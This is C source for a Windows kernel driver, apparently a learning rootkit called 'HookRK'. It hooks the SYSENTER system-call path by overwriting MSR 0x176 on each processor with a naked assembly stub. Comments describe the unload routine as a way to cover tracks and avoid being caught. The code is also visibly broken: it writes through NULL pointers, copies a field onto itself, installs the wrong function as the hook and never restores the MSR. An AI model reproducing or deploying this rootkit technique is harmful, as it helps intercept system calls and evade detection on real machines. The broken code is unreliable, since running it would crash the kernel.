//System includes
#include <ntddk.h>

#define DEVICE_RK 0x00008001	//used to register what sort of device this is, vendor defined 8000-FFFF

/*
	-----------------------------------
	Sysenter hook macros and structures
	-----------------------------------
*/
//Sysenter Hook macros
#define MSR_EIP 0x176	//this defines the EIP for the sysenter
#define nCPUs 32		//hard define of the number of CPUs
#define PRNTFREQ 1000	//how many a frequency for how often we will display the info in our 
						//new sysenter fcn addr
 
//Define a structure to hold the MSR addresses
typedef struct _MSR
{
	DWORD32 loaddr;
	DWORD32 highaddr;
}MSR, *PMSR;

DWORD32 originalMSRlovalue = 0;	//this will hold the original loaddr of msr_eip
DWORD32 currentindex = 0;	//this will be used to measure our frequency of printing


/*
	Device specific information
*/
const WCHAR *devicepath = L"\\Device\\HookRK";		//this is the path where the RK will be L = unicode
const WCHAR *linkdevicepath = L"\\DosDevices\\HookRK";		//this is the path of the link
PDEVICE_OBJECT devobj;	//pointer to a device object


NTSTATUS default_dispatch(PDRIVER_OBJECT pobj, PIRP pirp)
{
	UNREFERENCED_PARAMETER(pobj);
	DbgPrint("Entering default_dispatch Method \n");
	pirp->IoStatus.Status = STATUS_SUCCESS;	//set the irp status
	pirp->IoStatus.Information = 0;
	IoCompleteRequest(pirp, IO_NO_INCREMENT);	//send control back to the io manager

	return STATUS_SUCCESS;
}

NTSTATUS RegisterDriverDeviceName(PDRIVER_OBJECT pobj)
{
//DbgPrint("Registering the Device Driver\n");
	NTSTATUS ntstatus; //this is used to check the outputs of our driver calls
	UNICODE_STRING unistring; //this will be the string which will store the directory of the driver

	RtlInitUnicodeString(&unistring, devicepath);	//create a unicode string with our drive path
	
	//register our device driver with the OS
	ntstatus = IoCreateDevice
		(
			pobj,	//ptr to a driver object
			0,		//bytes for drive extention
			&unistring,		//this is the string which will hold the driver path
			DEVICE_RK,	//the device type
			0,		//system defined constants
			TRUE,	//driver object is an exclusive device
			&devobj	//reference to a device object
		);
	return ntstatus;
}

NTSTATUS RegisterDriverDeviceLink(void)
{
	DbgPrint("Registering the Device Driver Link\n");
	NTSTATUS ntstatus; //this is used to check the outputs of our driver calls

	UNICODE_STRING deviceunistring; //this will be the string which will store the directory of the driver
	UNICODE_STRING devicelinkunistring; //this will be the string which will store the directory of the link to the driver
	
	RtlInitUnicodeString(&deviceunistring, devicepath);	//create a unicode string with the device path
	RtlInitUnicodeString(&devicelinkunistring, linkdevicepath);	//create a unicode string with the device link path

	//create a symbolic link of the device in the location in linkdevicepath
	ntstatus = IoCreateSymbolicLink
		(
			&devicelinkunistring,	//unicode of the link
			&deviceunistring		//unicode of the device
		);

	return ntstatus;
}

/*
	FCN: Prnthookmsg
	This will be called when we execute the 
	sysenter instruction
*/
void prnthookmsg(DWORD32 dispatchid, DWORD32 stackPtr)
{
	//we will not display information every time
	//this is because every function in the windows api
	//will call this instruction
	if(currentindex == PRNTFREQ)
	{
		DbgPrint("[PRNTHOOKMSG]: on CPU[%u], (pid=%u, dispatchID=%x), Addr of stack = 0x%x \n", 
			KeGetCurrentProcessorNumber(), PsGetCurrentProcessId(), dispatchid, &stackPtr);

		currentindex = 0;
	}
	currentindex++;
}

/*
	FCN: newMSR
	this function will be what we replace
	the function with at MSR# 176, it
	will just print something to the user
	but we know we've hooked something
	note: We make this function a __declespec(naked) 
	function because we want to control
	the stack layout and the compiler will
	not create a prolog or epilogue
*/
void __declspec(naked)newMSR(void)
{
	__asm
	{
		pushad;	//push the register values on the stack
		pushfd;	//push eflags on the stack

		//Note this segment of code is needed
		mov ecx, 0x23;
		push 0x30;
		pop fs;
		mov ds, cx;
		mov es, cx;
		//---------------
		push edx;	//save the stack pointer
		push eax;	//dispatch ID
		call prnthookmsg;
		//---------------
		popfd;
		popad;
		jmp [originalMSRlovalue];
	}
}

//------------------------------------------------
/*
	FCN: readMSR
	this function will read the addr of a certain
	MSR register, and save it into our custom
	MSR structure
*/
void readMSR(DWORD32 regnumber, PMSR msr)
{
	DWORD32 loval;
	DWORD32 hival;

	__asm
	{
		//the rdmsr instr reads the
		//msr whose number is stored
		//in ecx, the contents will
		//be saved in eax(lower 32 bits), edx(higher 32 bits)
		mov ecx, regnumber;
		rdmsr;
		mov hival, edx;
		mov loval, eax;
	}

	//store the msr contents into
	//our msr structure
	msr->highaddr = hival;
	msr->loaddr = loval;

	return;
}
//------------------------------------------------

//------------------------------------------------
/*
	FCN: setMSR
	this function will read the addr of a certain
	MSR register, and save it into our custom
	MSR structure
*/
void setMSR(DWORD32 regnumber, PMSR msr)
{
	DWORD32 loval;
	DWORD32 hival;

	//store the high and low 
	//addr of the fcn we want
	//to write to the msr at regnumber
	hival = msr->highaddr;
	loval = msr->loaddr;

	__asm
	{
		mov ecx, regnumber;	//store the number of the msr we will write to, EIP msr
		mov edx, hival;		//set the hi 32 bits of the addr we want to write
		mov eax, loval;		//set the lo 32 bits of the addr we want to write
		wrmsr;				//write to the msr register
	}
	return;
}
//------------------------------------------------

//------------------------------------------------
/*
	FCN: HookCPU
	this function will read in the addr of MSR 0x176,
	save the old MSR value
	it will then write our own naked function into
	MSR 0x176
*/
DWORD32 HookCPU(DWORD32 procaddr)
{
	PMSR oldmsr = NULL;	//this will hold our old MSR value
	PMSR newmsr = NULL; //we will put our new function

	//read in the original MSR
	readMSR(MSR_EIP, oldmsr);

	//save the values into new msr struct
	newmsr->loaddr = oldmsr->loaddr;
	newmsr->highaddr = newmsr->highaddr;

	//Here we will only store the lower 32 bits, seeing as how our
	//addr of the new fcn we will replace the msr with
	newmsr->loaddr = procaddr;

	//set the value of the MSR 0x176
	setMSR(MSR_EIP, newmsr);

	//return the old value of the MSR for safe keeping
	return oldmsr->loaddr;
}
//------------------------------------------------

//------------------------------------------------
/*
	FCN: HookallCPUs
	This function will set the affinity to any running processor we want
	once we do that we can call the function HookCPU, which will replace the SYSENTER
	fcn call
*/
void HookAllCPUs(DWORD32 procaddr)
{
	KAFFINITY threadaffinity;
	KAFFINITY currentCPU;

	//get a bitmap of the active uP on the system
	threadaffinity = KeQueryActiveProcessors();

	for(DWORD32 i = 0; i<nCPUs; i++)
	{
		//This will mask the current cpu bit, and
		//set the affinity for that CPU
		currentCPU = threadaffinity & (1 << i);

		// see if our current value of i is an active CPU
		//if it is set the affinity to that CPU and run the
		//hook CPU function
		if(currentCPU != 0)
		{
			KeSetSystemAffinityThread(threadaffinity);

			//Check if the MSR has been read yet
			//if it has, then just call the hookCPU fcn
			//if it has not then save the MSR from the call to hookCPU fcn
			if(originalMSRlovalue == 0)
			{
				originalMSRlovalue = HookCPU(procaddr);
			}

			//we have already read 1 MSR for a processor(they are the same)
			else
			{
				HookCPU(procaddr);
			}
		}
	}

	//set the thread to some random uP
	KeSetSystemAffinityThread(threadaffinity);

	//send the signal to the waitforobject function
	PsTerminateSystemThread(STATUS_SUCCESS);
	return;
}
//------------------------------------------------

//------------------------------------------------
/*
	FCN: HookSysEnter
	This will be our top most call to Hook the SYSENTER instr
	1) Set up the initial structures
	2) Run a thread on each CPU, using the fcn KeSetAffinityThread
	3) Once we have captured a thread, read the MSR # 176
	4) Write in an address into MSR 176 that we choose
	5) Watch the magic
*/
void HookSysEnter(DWORD32 ProcessAddr)
{
	HANDLE hthread;		//handle to a thread
	OBJECT_ATTRIBUTES objattributes;	//object attributes struct
	PKTHREAD pkthreadobj = NULL;	//create a thread object
	LARGE_INTEGER timer;	//create a timer 

	//Initialize an object attribute stucture
	InitializeObjectAttributes(&objattributes, NULL, 0, NULL, NULL);

	//Create a new system thread to run the function that will hook ever CPU
	PsCreateSystemThread(&hthread, THREAD_ALL_ACCESS, &objattributes, NULL, NULL, (PKSTART_ROUTINE)HookAllCPUs, (PVOID)ProcessAddr);

	//Get a reference to a thread object from a handle to a thread
	ObReferenceObjectByHandle(hthread, THREAD_ALL_ACCESS, NULL, KernelMode, (PVOID*)pkthreadobj, NULL);

	timer.QuadPart = 300;	//this will be used to set the timeout value

	//Create a spin loop until our created thread running the HookAllCPUs routine returns
	while(KeWaitForSingleObject((PVOID)pkthreadobj, Executive, KernelMode, FALSE, &timer) != STATUS_SUCCESS)
	{
		// keep spinning until our created thread has exited
	}

	ZwClose(hthread);
	return;
}
//------------------------------------------------

//This is the function is called when the device is removed from the
//kernel space
void unload(PDRIVER_OBJECT pobj)
{
	DbgPrint("Unloading the Device\n");
	PDEVICE_OBJECT pdevobj;
	UNICODE_STRING unistring;

	pdevobj = pobj->DeviceObject;	//get a pointer to the device object

	//we must perform this step otherwise the entries
	//we registered wont be cleared until we reboot the system
	RtlInitUnicodeString(&unistring, linkdevicepath);
	IoDeleteSymbolicLink(&unistring);	//remove the symobilc link entry

	RtlInitUnicodeString(&unistring, linkdevicepath);
	IoDeleteDevice(pdevobj);	//remove the device entry

	return;
}


//Main entry point into a KMD
extern "C" NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING regpath)
{
	UNREFERENCED_PARAMETER(regpath);
	DbgPrint("Entering The Device Driver Main Fcn\n");
	int i;
	NTSTATUS ntstatus; //this is used to check the outputs of our driver calls

	//set the MAJOR functions table in my KMD to default_dispatch function
	//which really does nothing
	for(i=0; i<IRP_MJ_MAXIMUM_FUNCTION;i++)
	{
		//set each entry into the major functions to default
		//dispatch
		pDriverObject->MajorFunction[i] = (PDRIVER_DISPATCH)default_dispatch;
	}

	//establish the unload function
	//we must tell the kmd what to do when the OS
	//unloads it, we do this to clean up our tracks
	//and undo whatever we have done, prevents getting 
	//caught
	pDriverObject->DriverUnload = unload;


	//register the device name
	ntstatus = RegisterDriverDeviceName(pDriverObject);

	if(!NT_SUCCESS(ntstatus))
	{
		//we have failed to register the device
		return ntstatus;
	}

	ntstatus = RegisterDriverDeviceLink();
	if(!NT_SUCCESS(ntstatus))
	{
		//we have failed to create the link
		return ntstatus;
	}

	//Hook the SYSENTER INSTR
	HookSysEnter((DWORD32)prnthookmsg);

	return STATUS_SUCCESS;
}
